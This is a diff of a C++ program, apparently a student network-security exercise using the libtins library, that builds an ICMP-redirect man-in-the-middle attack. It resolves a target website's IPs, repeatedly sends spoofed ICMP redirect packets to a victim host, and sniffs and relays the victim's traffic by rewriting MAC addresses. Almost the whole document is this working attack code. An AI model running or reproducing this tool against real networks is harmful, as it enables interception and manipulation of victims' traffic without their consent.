@@ -12,16 +12,63 @@
 #else
 #include <unistd.h>
 #endif // _WIN32
+#include <winsock2.h>
+#include <WS2tcpip.h>
+#include <regex>
+#include<process.h>
+#include<vector>
 using namespace std;
 using namespace Tins;
 using std::cout;
 using std::runtime_error;
 using std::endl;
+std::string URLToAddrStr(std::string addr, vector<string> &IP)
+{
+	WSADATA wsadata;
+	WSAStartup(MAKEWORD(1, 1), &wsadata);
+	struct addrinfo hints;
+	struct addrinfo *result, *rp;
+	struct sockaddr_in *sin;
+	int *listen_fd;
+	int listen_fd_num = 0;
+	char buf[80] = { 0x00, };
+	int i = 0;
+	memset(&hints, 0x00, sizeof(struct addrinfo));
+	hints.ai_flags = AI_PASSIVE;
+	hints.ai_family = AF_UNSPEC;
+	hints.ai_socktype = SOCK_STREAM;
+	if (getaddrinfo(addr.c_str(), NULL, &hints, &result) != 0)
+	{
+		perror("getaddrinfo");
+		return std::string("");
+	}
+	for (rp = result; rp != NULL; rp = rp->ai_next)
+	{
+		listen_fd_num++;
+	}
+	listen_fd = (int *)malloc(sizeof(int)*listen_fd_num);
+	printf("Num %d", listen_fd_num);
+	for (rp = result; rp != NULL; rp = rp->ai_next)
+	{
+		if (rp->ai_family == AF_INET)
+		{
+			sin = (sockaddr_in *)rp->ai_addr;
+			inet_ntop(rp->ai_family, &sin->sin_addr, buf, sizeof(buf));
+			printf("<bind 정보 %d %d %s>\n", rp->ai_protocol, rp->ai_socktype, buf);
+			IP.push_back(buf);
+		}
+	}
 
-void icmp_redirect(NetworkInterface iface, IPv4Address gw, IPv4Address attack, IPv4Address victim, IPv4Address webip, const NetworkInterface::Info& info)
+	WSACleanup();
+	return std::string("true");
+}
+
+
+void icmp_redirect(NetworkInterface iface, IPv4Address gw, IPv4Address attack, IPv4Address victim, vector<string> ip , const NetworkInterface::Info& info)
 {
 	PacketSender sender;
 	EthernetII::address_type attack_hw, victim_hw, gw_hw;
+	IPv4Address webip;
 	attack_hw = info.hw_addr; // my macaddress get
 	victim_hw = Utils::resolve_hwaddr(iface, victim, sender); // victim macaddress get
 	gw_hw = Utils::resolve_hwaddr(iface, gw, sender);
@@ -32,155 +79,95 @@ void icmp_redirect(NetworkInterface iface, IPv4Address gw, IPv4Address attack, I
 	uint8_t *data;
 	data = (uint8_t *)malloc(8);
 	memset(data, NULL, 8);
-<<<<<<< HEAD
-	EthernetII victim_icmp = EthernetII(victim_hw, gw_hw) / IP(victim, gw) / icmp / IP(webip, victim) / RawPDU(data, 8);
-	EthernetII gw_icmp = EthernetII(attack_hw, gw_hw) / IP(attack, gw) / icmp / IP(webip, gw) / RawPDU(data, 8);
-=======
-	EthernetII do_icmp = EthernetII(victim_hw, gw_hw) / IP(victim, gw) / icmp / IP(webip, victim) / RawPDU(data, 8);
-
->>>>>>> 408c11708177fb93c5e20c0349f59f4306248421
+	
 	while (true) {
-		sender.send(victim_icmp, iface);
+		for (vector<string>::size_type i = 0; i < ip.size(); i++)
+		{
+			webip = ip[i];
+			EthernetII victim_icmp = EthernetII(victim_hw, gw_hw) / IP(victim, gw) / icmp / IP(webip, victim) / RawPDU(data, 8);
+			EthernetII gw_icmp = EthernetII(attack_hw, gw_hw) / IP(attack, gw) / icmp / IP(webip, gw) / RawPDU(data, 8);
+			sender.send(victim_icmp, iface);
+		}
+		
 #ifdef _WIN32
-<<<<<<< HEAD
-		Sleep(2000);
-=======
-		Sleep(10);
->>>>>>> 408c11708177fb93c5e20c0349f59f4306248421
+		Sleep(300);
 #else
 		sleep(5);
 #endif
 	}
 }
-<<<<<<< HEAD
-void relay(PDU *some_pdu, NetworkInterface iface,IPv4Address web_ip, EthernetII::address_type attack_hw, EthernetII::address_type victim_hw, EthernetII::address_type gw_hw)
+void relay(PDU *some_pdu, NetworkInterface iface, EthernetII::address_type attack_hw, EthernetII::address_type victim_hw, EthernetII::address_type gw_hw)
 {
-
 	PacketSender sender;
 	EthernetII *eth = some_pdu->find_pdu<EthernetII>();
 	IP *ip = some_pdu->find_pdu<IP>();
-	if(ip != NULL)
+	if (ip != NULL)
 	{
-		if((eth->src_addr().to_string() == victim_hw.to_string()))
+		if ((eth->src_addr().to_string() == victim_hw.to_string()))
 		{
 			eth->src_addr(attack_hw);
+			eth->dst_addr(gw_hw);
 			some_pdu->send(sender, iface.name());
-			cout << "victim -> attack " << endl;
-			cout << "eth src :" << eth->src_addr() << endl;
-			cout << "eth dst :" << eth->dst_addr() << endl;
-			cout << "SRC ip :" << ip->src_addr() << endl;
-			cout << "dst ip :" << ip->dst_addr() << endl;
-			
+			//cout << "victim -> attack " << endl;
+			//cout << "eth src :" << eth->src_addr() << endl;
+			//cout << "eth dst :" << eth->dst_addr() << endl;
+			//cout << "SRC ip :" << ip->src_addr() << endl;
+			//cout << "dst ip :" << ip->dst_addr() << endl;
 		}
-	
-		else if ((eth->dst_addr().to_string() == attack_hw.to_string()))
+		if ((eth->dst_addr().to_string() == attack_hw.to_string()))
 		{
 			eth->dst_addr(victim_hw);
 			some_pdu->send(sender, iface.name());
-			cout << "web -> attack " << endl;
-			cout << "eth src :" << eth->src_addr() << endl;
-			cout << "eth dst :" << eth->dst_addr() << endl;
-			cout << "SRC ip :" << ip->src_addr() << endl;
-			cout << "dst ip :" << ip->dst_addr() << endl;
-		
+			//cout << "web -> attack " << endl;
+			//cout << "eth src :" << eth->src_addr() << endl;
+			//cout << "eth dst :" << eth->dst_addr() << endl;
+			//cout << "SRC ip :" << ip->src_addr() << endl;
+			//cout << "dst ip :" << ip->dst_addr() << endl;
 		}
-		
 	}
-	
-=======
-void relay(PDU *some_pdu, NetworkInterface iface, IPv4Address victim, EthernetII::address_type attack_hw, EthernetII::address_type victim_hw, EthernetII::address_type gw_hw)
-{
-	
-	PacketSender sender;
-	EthernetII *eth = some_pdu->find_pdu<EthernetII>();
-	IP *ip = some_pdu->find_pdu<IP>();
-	if(ip->src_addr().to_string() == victim.to_string())
-	{
-	cout << "victim -> attack " << endl;
-	cout << "eth src :" << eth->src_addr() << endl;
-	cout << "eth dst :" << eth->dst_addr() << endl;
-	cout << "SRC ip :" << ip->src_addr() << endl;
-	cout << "dst ip :" << ip->dst_addr() << endl;
-	eth->src_addr(attack_hw);
-	//some_pdu->send(sender, iface.name());
-	}
-	else if (ip->dst_addr().to_string() == victim.to_string())
-	{
-	cout << "attack -> victim " << endl;
-	cout << "eth src :" << eth->src_addr() << endl;
-	cout << "eth dst :" << eth->dst_addr() << endl;
-	cout << "SRC ip :" << ip->src_addr() << endl;
-	cout << "dst ip :" << ip->dst_addr() << endl;
-	eth->dst_addr(victim_hw);
-	//sender.send((PDU &)some_pdu, iface.name());
-	//some_pdu->send(sender, iface.name());
-	}
->>>>>>> 408c11708177fb93c5e20c0349f59f4306248421
-
 }
 
 int main(int argc, char* argv[]) {
 	if (argc != 5) {
-		cout << "Usage: " << *argv << " <Gateway> <Attack> <Victim> <Default>" << endl;
+		cout << "Usage: " << *argv << " <Gateway> <Attack> <Victim> <Website_URL>" << endl;
 		return 1;
 	}
 	PacketSender sender;
 	EthernetII::address_type attack_hw, victim_hw, gw_hw;
-	IPv4Address gw, victim, attack, web_ip;
-<<<<<<< HEAD
-
-
-=======
-	
-	
->>>>>>> 408c11708177fb93c5e20c0349f59f4306248421
+	IPv4Address gw, victim, attack;
+	string url;
+	vector<string> URL_IP;
 	try {
 		gw = argv[1];
 		attack = argv[2];
 		victim = argv[3];
-		web_ip = argv[4];
-
+		url = argv[4];
 		cout << "gate way ip : " << gw << endl;
 		cout << "attack ip : " << attack << endl;
 		cout << "victim ip : " << victim << endl;
-		cout << "web ip : " << web_ip << endl;
 	}
 	catch (...) {
 		cout << "Invalid ip found...\n";
 		return 2;
 	}
-
 	NetworkInterface iface;
 	NetworkInterface::Info info;
-	
 	try {
 		iface = gw;
 		info = iface.addresses();
 		attack_hw = info.hw_addr;
-<<<<<<< HEAD
 		victim_hw = Utils::resolve_hwaddr(iface, victim, sender); // victim macaddress get
 		gw_hw = Utils::resolve_hwaddr(iface, gw, sender); // gateway macaddress get
-=======
->>>>>>> 408c11708177fb93c5e20c0349f59f4306248421
 	}
 	catch (runtime_error& ex) {
 		cout << ex.what() << endl;
 		return 3;
 	}
-<<<<<<< HEAD
-	
 	try {
-		std::thread infect(icmp_redirect, iface, gw, attack, victim, web_ip, info);
-		infect.detach();
-
-=======
-	victim_hw = Utils::resolve_hwaddr(iface, victim, sender); // victim macaddress get
-	gw_hw = Utils::resolve_hwaddr(iface, gw, sender); // gateway macaddress get
-	try {
-		std::thread infect(icmp_redirect,iface,gw,attack,victim,web_ip,info);
-		infect.detach();
 		
->>>>>>> 408c11708177fb93c5e20c0349f59f4306248421
+			URLToAddrStr(url, URL_IP);
+			std::thread infect(icmp_redirect, iface, gw, attack, victim, URL_IP, info);
+			infect.detach();
 	}
 	catch (runtime_error& ex) {
 		cout << "Runtime error: " << ex.what() << endl;
@@ -188,19 +175,12 @@ int main(int argc, char* argv[]) {
 	}
 	Sniffer sniff(iface.name());
 	cout << "relay.." << endl;
-<<<<<<< HEAD
 	while (true)
 	{
 		PDU *pdu = sniff.next_packet();
-		relay(pdu, iface, web_ip, attack_hw, victim_hw, gw_hw);
-		//delete pdu;
-=======
-	while(true)
-	{
-	PDU *pdu = sniff.next_packet();
-	relay(pdu,iface,victim,attack_hw,victim_hw,gw_hw);
->>>>>>> 408c11708177fb93c5e20c0349f59f4306248421
+		relay(pdu, iface, attack_hw, victim_hw, gw_hw);
+		delete pdu;
 	}
-
 	return 0;
 }
+
